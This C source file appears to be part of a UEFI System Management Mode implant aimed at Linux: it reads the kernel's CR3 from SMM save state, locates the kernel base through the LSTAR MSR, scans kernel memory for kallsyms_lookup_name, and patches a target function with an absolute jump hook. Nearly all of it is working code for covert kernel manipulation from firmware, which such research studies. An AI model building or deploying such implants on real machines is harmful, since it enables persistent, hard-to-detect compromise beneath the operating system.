#include <Library/BaseLib.h>
#include "linux.h"
#include "memory.h"
#include "serial.h"

static EFI_SMM_CPU_PROTOCOL* Cpu = NULL;
static EFI_SMM_SYSTEM_TABLE2* GSmst2 = NULL;
static BOOLEAN SetupDone = FALSE;
static UINT64 KernelCr3 = 0;
static UINT64 KernelBase = 0;
static UINT8 KallsymsPattern[] = { 0x8B, 0x04, 0x25, 0x69, 0x69, 0x69, 0x69, 0x48, 0x89, 0x45, 0xf0, 0x31,0xc0, 0x80, 0x3f, 0x00, 0xc7};
static KallsymsLookupName KallsymsLookUpName = NULL;
void Shellcode(void);

unsigned char* print = "_printk";
unsigned char* printstring = "Zepta";

EFI_STATUS SetupLinux(EFI_SMM_CPU_PROTOCOL* cpu, EFI_SMM_SYSTEM_TABLE2* smst)
{
  SERIAL_PRINT("Trying to setup linux \r\n",);

  if (SetupDone == TRUE)
  {
      return EFI_SUCCESS;
  }

  if (cpu == NULL || smst == NULL)
  {
      return EFI_INVALID_PARAMETER;
  }
  Cpu = cpu;
  GSmst2 = smst;

  EFI_STATUS status = GetLinuxKernelCr3(&KernelCr3);
  if (EFI_ERROR(status))
  {
      SERIAL_PRINT("Failed to find linux cr3 %llx \r\n", status);
      return status;
  }

  status = GetLinuxKernelBase(&KernelBase);
  if (EFI_ERROR(status))
  {
      SERIAL_PRINT("Failed to find linux base %llx \r\n", status);
      return status;
  }

  volatile KallsymsLookupName kallsyms = FindLinuxKallsymsLookupName(KernelBase);
  if (kallsyms == NULL)
  {
      SERIAL_PRINT("Failed to find linux kallsyms %llx \r\n", status);
      return EFI_NOT_FOUND;
  }

  KallsymsLookUpName = kallsyms;
  SERIAL_PRINT("Found kallsyms %llx \r\n", KallsymsLookUpName);

  SetupDone = TRUE;

  return EFI_SUCCESS;
}

EFI_STATUS GetLinuxKernelBase(UINT64* base)
{
  if (base == NULL)
  {
      return EFI_INVALID_PARAMETER;
  }

  /*
  UINT64 idt = 0; [https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf] chap 10.21
  EFI_STATUS status = GetIdtBase(&idt);
  PKIDTENTRY64 entry = (PKIDTENTRY64)(idt + (0xE * 16));  // (#PF);
  UINT64 pf = entry->idt.offsets.offsetlow | ((UINT64)entry->idt.offsets.offsetmiddle << 16) | ((UINT64)entry->idt.offsets.offsethigh << 32);
  */

  UINT64 entry = AsmReadMsr64(0xC0000082);

  if(entry == 0)
  {
    return EFI_NOT_FOUND;
  }

  // Align 1MB
  UINT64 kernel = entry & 0xFFFFFFFFFFF00000;
  kernel -= 0x1400000;

  *base = kernel;

  return EFI_SUCCESS;
}

EFI_STATUS GetLinuxKernelCr3(UINT64* cr3)
{
  if (cr3 == NULL)
  {
      return EFI_INVALID_PARAMETER;
  }

  UINT64 tempcr3;
  EFI_STATUS status = Cpu->ReadSaveState(Cpu, sizeof(tempcr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, GSmst2->CurrentlyExecutingCpu, (VOID*)&tempcr3);

  if(EFI_ERROR(status) || tempcr3 == 0 || tempcr3 == AsmReadCr3())
  {
    return EFI_NOT_FOUND;
  }

  *cr3 = tempcr3;

  return EFI_SUCCESS;
}

KallsymsLookupName FindLinuxKallsymsLookupName(UINT64 base)
{
  UINT32 i;
	UINT32 j;
	BOOLEAN found = FALSE;
	UINT64 kaddr = base;

	for ( i = 0x0 ; i < 0x200000 ; i++ )
	{
		for(j = 0; j < sizeof(KallsymsPattern); j++)
		{
		    if(KallsymsPattern[j] == 0x69)
		    {
		        found = TRUE;
		        continue;
		    }
        UINT8 byte = ReadVirtual8(kaddr + j, KernelCr3);
		    //UINT8 byte = ReadPhysical8(TranslateVirtualToPhysical(KernelCr3, (kaddr + j)));
        
		    if(byte != KallsymsPattern[j])
		    {
		        found = FALSE;
		        break;
		    }
		    else
		    {
		        found = TRUE;
		    }
	    
		}
		if(found == TRUE)
		{
		  return (KallsymsLookupName)(kaddr - 0x10);
		}
		
		
		kaddr += 0x10;
	}

	return NULL;
}

EFI_STATUS PatchRtmFunction(UINT64 phystarget, UINT64 dos)
{
  if (!phystarget)
  {
    return EFI_INVALID_PARAMETER;
  }

  UINT8* target = (UINT8*)phystarget;

  target[0] = 0xFF;
  target[1] = 0x25;
  target[2] = 0x00;
  target[3] = 0x00;
  target[4] = 0x00;
  target[5] = 0x00;

  *(UINT64*)(target + 6) = dos;

}

KallsymsLookupName GetKallsyms()
{
  return KallsymsLookUpName;
}
